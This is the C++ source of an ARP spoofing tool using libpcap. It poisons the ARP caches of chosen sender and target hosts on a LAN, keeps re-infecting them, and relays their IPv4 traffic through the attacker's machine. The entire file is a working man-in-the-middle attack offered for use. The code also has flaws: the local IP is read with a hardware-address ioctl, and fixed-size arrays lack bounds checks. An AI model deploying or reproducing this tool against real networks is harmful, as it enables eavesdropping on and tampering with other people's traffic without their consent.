#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <unistd.h>
#include <cstring>
#include <string>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <thread>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
	exit(1);
}

char *dev;
pcap_t *handle;
Mac mymac;
Ip myip;

void getmyinfo() {
	struct ifreq s;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) {
		printf("Failed to make mac socket\n");
		exit(1);
	}

	strncpy(s.ifr_name, dev, IFNAMSIZ);
	if(ioctl(fd, SIOCGIFHWADDR, &s) < 0) {
		printf("Failed to get MAC\n");
		exit(1);
	}

	uint8_t tmp[Mac::SIZE];
	memcpy(tmp, s.ifr_hwaddr.sa_data, Mac::SIZE);
	mymac = Mac(tmp);
	close(fd);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) {
		printf("Failed to make ip socket\n");
		exit(1);
	}

	s.ifr_addr.sa_family = AF_INET;
	strncpy(s.ifr_name, dev, IFNAMSIZ);
	if(ioctl(fd, SIOCGIFHWADDR, &s) < 0) {
		printf("Failed to get Ip address\n");
		exit(1);
	}

	myip = Ip(inet_ntoa(((struct sockaddr_in *)&s.ifr_addr)->sin_addr));
	close(fd);
}

void makepacket(EthArpPacket &p, Mac smac, Mac dmac, Ip sip, Ip dip, bool isRequest) {
	p.eth_.smac_ = smac;
	p.eth_.dmac_ = dmac;
	p.eth_.type_ = htons(EthHdr::Arp);

	p.arp_.hrd_ = htons(ArpHdr::ETHER);
	p.arp_.pro_ = htons(EthHdr::Ip4);
	p.arp_.hln_ = Mac::SIZE;
	p.arp_.pln_ = Ip::SIZE;
	p.arp_.op_ = htons(isRequest ? ArpHdr::Request : ArpHdr::Reply);

	p.arp_.smac_ = smac;
	p.arp_.sip_ = htonl(sip);
	p.arp_.tmac_ = isRequest ? Mac("00:00:00:00:00:00"): dmac;
	p.arp_.tip_ = htonl(dip);
}

Mac getmac(Ip ip) {
	EthArpPacket packet;
	makepacket(packet, mymac, Mac("ff:ff:ff:ff:ff:ff"), myip, ip, true);
	while(1) {
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			printf("Failed to get Mac from %s\n", std::string(ip).c_str());
			exit(1);
		}

		struct pcap_pkthdr *header;
		const u_char *recv;
		res = pcap_next_ex(handle, &header, &recv);
		if(res == 0)
			continue;
		if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			printf("Failed during getting Mac from %s\n", std::string(ip).c_str());
			pcap_close(handle);
			exit(1);
		}

		EthArpPacket *ans = (EthArpPacket *) recv;
		if(htons(ans -> eth_.type_) == EthHdr::Arp && ntohl(ans -> arp_.sip_) == ip) {
			uint8_t ret[Mac::SIZE];
			memcpy(ret, & ans -> arp_.smac_, Mac::SIZE);
			return Mac(ret);
		}
	}
}

bool stop = false;
void rep(EthArpPacket packet) {
	while(1) {
		pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if(stop) return;
		sleep(10);
	}
}

void flow(Ip sip, Ip tip, Mac smac, Mac dmac) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *myhandle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (myhandle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(1);
	}

	EthArpPacket packet;
	makepacket(packet, mymac, smac, tip, sip, false);
	
	int res = pcap_sendpacket(myhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(myhandle));
		printf("%s -> %s spoofing failed...\n", std::string(sip).c_str(), std::string(tip).c_str());
		return;
	}
	std::thread inf(rep, packet);

	while(1) {
		if(stop) break;

		struct pcap_pkthdr *header;
		const u_char *recv;
		res = pcap_next_ex(myhandle, &header, &recv);
		if(res == 0)
			continue;
		if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(myhandle));
			printf("Failed during relaying %s -> %s\n", std::string(sip).c_str(), std::string(tip).c_str());
			pcap_close(myhandle);
			stop = true;
			exit(1);
		}

		EthArpPacket *pk = (EthArpPacket *) recv;
		if(ntohs(pk -> eth_.type_) == EthHdr::Arp && ntohs(pk -> arp_.op_) == ArpHdr::Request) {
			res = pcap_sendpacket(myhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(myhandle));
				printf("Failed re-infecting %s -> %s\n", std::string(sip).c_str(), std::string(tip).c_str());
				stop = true;
				break;
			}
		}
		if(ntohs(pk -> eth_.type_) == EthHdr::Ip4 && pk -> eth_.smac_ == smac) {
			pk -> eth_.smac_ = mymac;
			pk -> eth_.dmac_ = dmac;
			res = pcap_sendpacket(myhandle, reinterpret_cast<const u_char*>(pk), header -> len);
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(myhandle));
				printf("Failed relaying %s -> %s\n", std::string(sip).c_str(), std::string(tip).c_str());
				stop = true;
				break;
			}
		}
	}

	pcap_close(myhandle);
	inf.join();
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc & 1)
		usage();

	dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(1);
	}

	getmyinfo();

	Mac macarr[105];
	for(int i = 2; i < argc; i ++)
		macarr[i] = getmac(Ip(argv[i]));

	std::thread t[105];
	for(int i = 2; i < argc; i += 2)
		t[i] = std::thread(flow, Ip(argv[i]), Ip(argv[i + 1]), macarr[i], macarr[i + 1]);

	for(char quit = 0; quit != 'q'; scanf(" %c", &quit));
	stop = true;
	for(int i = 2; i < argc; i+=2)
		t[i].join();
	
	pcap_close(handle);
	printf("Exit Program.\n");
	return 0;
}
